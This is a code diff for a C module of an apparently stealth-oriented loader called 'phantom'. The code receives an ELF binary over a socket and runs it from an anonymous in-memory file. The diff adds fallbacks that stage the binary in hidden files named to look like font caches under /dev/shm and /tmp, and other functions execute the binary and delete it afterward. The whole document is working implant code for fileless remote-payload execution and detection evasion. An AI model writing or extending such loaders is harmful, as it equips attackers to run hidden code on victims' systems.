@@ -1,11 +1,12 @@
-
 #include "memfd_loader.h"
 #include "crypto_engine.h"
 #include "utils.h"
+#include "phantom.h"
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <stdio.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
@@ -83,13 +84,40 @@ int ph_memfd_create_file(ph_memfd_ctx_t *ctx)
         return PH_ERR_NULL_PTR;
     }
 
+    // Try memfd_create first
     int fd = (int)syscall(SYS_memfd_create, ctx->memfd_name, MFD_CLOEXEC | MFD_ALLOW_SEALING);
-    if (fd < 0) {
-        return PH_ERR_MEMORY;
+    if (fd >= 0) {
+        ctx->memfd = fd;
+        ctx->exec_mode = PH_EXEC_MODE_MEMFD;
+        write(STDERR_FILENO, "[+] Binary Staged in Memory.\n", 29);
+        return PH_OK;
+    }
+    
+    write(STDERR_FILENO, "MEMFD_FAIL: memfd_create failed, attempting fallback\n", 53);
+
+    // Fallback 1: /dev/shm/.font-unix-cache
+    const char *fallback1 = "/dev/shm/.font-unix-cache";
+    mkdir("/dev/shm", 0755);
+    fd = open(fallback1, O_RDWR | O_CREAT | O_TRUNC, 0700);
+    if (fd >= 0) {
+        ctx->memfd = fd;
+        ctx->exec_mode = PH_EXEC_MODE_DISK;
+        write(STDERR_FILENO, "[+] Binary Staged in /dev/shm.\n", 31);
+        return PH_OK;
     }
 
-    ctx->memfd = fd;
-    return PH_OK;
+    // Fallback 2: /tmp/.font-unix-cache
+    const char *fallback2 = "/tmp/.font-unix-cache";
+    fd = open(fallback2, O_RDWR | O_CREAT | O_TRUNC, 0700);
+    if (fd >= 0) {
+        ctx->memfd = fd;
+        ctx->exec_mode = PH_EXEC_MODE_DISK;
+        write(STDERR_FILENO, "[+] Binary Staged in /tmp.\n", 27);
+        return PH_OK;
+    }
+
+    write(STDERR_FILENO, "STAGE_FAIL: no executable staging area\n", 39);
+    return PH_ERR_MEMORY;
 }
 
 void ph_memfd_cleanup(ph_memfd_ctx_t *ctx)
@@ -137,6 +165,7 @@ int ph_memfd_receive_elf(ph_memfd_ctx_t *ctx, int socket_fd)
 
         ssize_t bytes_written = write(ctx->memfd, ctx->receive_buffer, (size_t)bytes_read);
         if (bytes_written < 0) {
+            write(STDERR_FILENO, "MEMFD_FAIL: write to staging failed\n", 36);
             return PH_ERR_MEMORY;
         }
 
@@ -144,11 +173,13 @@ int ph_memfd_receive_elf(ph_memfd_ctx_t *ctx, int socket_fd)
         ctx->bytes_received = total_received;
 
         if (total_received > PH_MEMFD_MAX_SIZE) {
+            write(STDERR_FILENO, "MEMFD_FAIL: payload too large\n", 30);
             return PH_ERR_INVALID_ARG;
         }
     }
 
     if (bytes_read < 0) {
+        write(STDERR_FILENO, "MEMFD_FAIL: read from socket failed\n", 36);
         return PH_ERR_NETWORK;
     }
 
@@ -188,16 +219,18 @@ int ph_memfd_receive_elf_chunked(ph_memfd_ctx_t *ctx, int socket_fd, size_t tota
             if (errno == EINTR) {
                 continue;
             }
+            write(STDERR_FILENO, "MEMFD_FAIL: read chunk from socket failed\n", 42);
             return PH_ERR_NETWORK;
         }
 
         if (bytes_read == 0) {
-
+            write(STDERR_FILENO, "MEMFD_FAIL: premature EOF from socket\n", 38);
             return PH_ERR_NETWORK;
         }
 
         ssize_t bytes_written = write(ctx->memfd, ctx->receive_buffer, (size_t)bytes_read);
         if (bytes_written < 0) {
+            write(STDERR_FILENO, "MEMFD_FAIL: write chunk to staging failed\n", 42);
             return PH_ERR_MEMORY;
         }
 
@@ -220,7 +253,7 @@ int ph_memfd_validate_elf(ph_memfd_ctx_t *ctx, ph_elf_header_t *header)
     }
 
     if (ctx->elf_size < 64) {
-
+        write(STDERR_FILENO, "MEMFD_FAIL: payload too small for ELF header\n", 45);
         return PH_ERR_INVALID_ARG;
     }
 
@@ -234,6 +267,7 @@ int ph_memfd_validate_elf(ph_memfd_ctx_t *ctx, ph_elf_header_t *header)
     lseek(ctx->memfd, saved_pos, SEEK_SET);
 
     if (bytes_read < 64) {
+        write(STDERR_FILENO, "MEMFD_FAIL: failed to read ELF header\n", 38);
         return PH_ERR_INVALID_ARG;
     }
 
@@ -250,6 +284,7 @@ int ph_memfd_verify_elf_header(const uint8_t *buffer, size_t size, ph_elf_header
 
     if (buffer[0] != 0x7f || buffer[1] != 'E' || buffer[2] != 'L' || buffer[3] != 'F') {
         header->is_valid = 0;
+        write(STDERR_FILENO, "MEMFD_FAIL: invalid ELF magic\n", 30);
         return PH_ERR_INVALID_ARG;
     }
 
@@ -276,11 +311,13 @@ int ph_memfd_verify_elf_header(const uint8_t *buffer, size_t size, ph_elf_header
                               (uint32_t)(buffer[24]);
     } else {
         header->is_valid = 0;
+        write(STDERR_FILENO, "MEMFD_FAIL: unsupported ELF class\n", 34);
         return PH_ERR_INVALID_ARG;
     }
 
     if (header->type != 2 && header->type != 3) {
         header->is_valid = 0;
+        write(STDERR_FILENO, "MEMFD_FAIL: invalid ELF type (not EXEC or DYN)\n", 47);
         return PH_ERR_INVALID_ARG;
     }
 
@@ -310,6 +347,7 @@ int ph_memfd_execute(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[]
         return PH_OK;
     }
 
+    write(STDERR_FILENO, "MEMFD_FAIL: direct memory execution failed\n", 43);
     return PH_ERR_STEALTH;
 }
 
@@ -359,6 +397,7 @@ int ph_memfd_execute_disk_fallback(ph_memfd_ctx_t *ctx, const char *disk_path, c
 
     int fd = open(disk_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
     if (fd < 0) {
+        write(STDERR_FILENO, "MEMFD_FAIL: failed to open disk fallback path\n", 46);
         return PH_ERR_MEMORY;
     }
 
@@ -375,6 +414,7 @@ int ph_memfd_execute_disk_fallback(ph_memfd_ctx_t *ctx, const char *disk_path, c
         if (bytes_written < 0) {
             close(fd);
             lseek(ctx->memfd, saved_pos, SEEK_SET);
+            write(STDERR_FILENO, "MEMFD_FAIL: failed to write to disk fallback\n", 45);
             return PH_ERR_MEMORY;
         }
         total_written += (size_t)bytes_written;
@@ -384,12 +424,13 @@ int ph_memfd_execute_disk_fallback(ph_memfd_ctx_t *ctx, const char *disk_path, c
     close(fd);
 
     if (total_written != ctx->elf_size) {
+        write(STDERR_FILENO, "MEMFD_FAIL: disk fallback size mismatch\n", 40);
         return PH_ERR_MEMORY;
     }
 
     int ret = execve(disk_path, argv, envp);
     if (ret < 0) {
-
+        write(STDERR_FILENO, "MEMFD_FAIL: disk fallback execution failed\n", 43);
         unlink(disk_path);
         return PH_ERR_STEALTH;
     }
@@ -440,6 +481,7 @@ int ph_memfd_seal_file(ph_memfd_ctx_t *ctx)
 
     int ret = fcntl(ctx->memfd, F_ADD_SEALS, seals);
     if (ret < 0) {
+        write(STDERR_FILENO, "MEMFD_FAIL: failed to seal memfd\n", 33);
         return PH_ERR_STEALTH;
     }
 
